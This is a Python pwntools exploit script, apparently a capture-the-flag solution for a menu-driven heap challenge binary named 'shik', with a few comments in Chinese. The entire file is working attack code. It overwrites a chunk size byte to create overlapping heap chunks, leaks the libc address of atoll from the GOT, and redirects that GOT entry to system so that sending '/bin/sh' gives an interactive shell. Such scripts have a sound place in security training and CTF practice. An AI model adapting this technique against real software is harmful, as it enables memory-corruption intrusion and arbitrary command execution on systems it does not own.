#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./shik"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def allocate(length,content):
    opt(1)
    p.sendlineafter("Size:",str(length))
    p.sendlineafter("Content:",str(content))

def free(idx):
    opt(2)
    p.sendlineafter("Index:",str(idx))

def add(magic):
    opt(3)
    p.sendlineafter("magic :",str(magic))

def list():
    opt(4)

def edit(magic):
    opt(5)
    p.sendlineafter(":",str(magic))

allocate(0x30,"da") # 0
allocate(0x160,"z"*0xf0 + p64(0x100)) # 1
allocate(0xf0,"da") # 2

free(1)
free(0)
allocate(0x38,"a"*0x38) # 覆盖第二个chunk的size位最低字节为0
allocate(0x80,"da") # 切割第二个chunk为 0x91 和 0x71
add("da")
free(1)
free(2)
allocate(0x200,"a"*0x90+p64(elf.got["atoll"]))
list()
p.recv(7)
atoll_addr = u64(p.recv(6).ljust(8,"\0"))
system_addr = atoll_addr - libc.sym["atoll"] + libc.sym["system"]
log.success("system_addr is -> " + hex( system_addr ))

edit(p64(system_addr))
p.sendline("/bin/sh\x00")
# gdb.attach(p,"set $h=0x603000,$g=0x6020b0")

p.interactive()
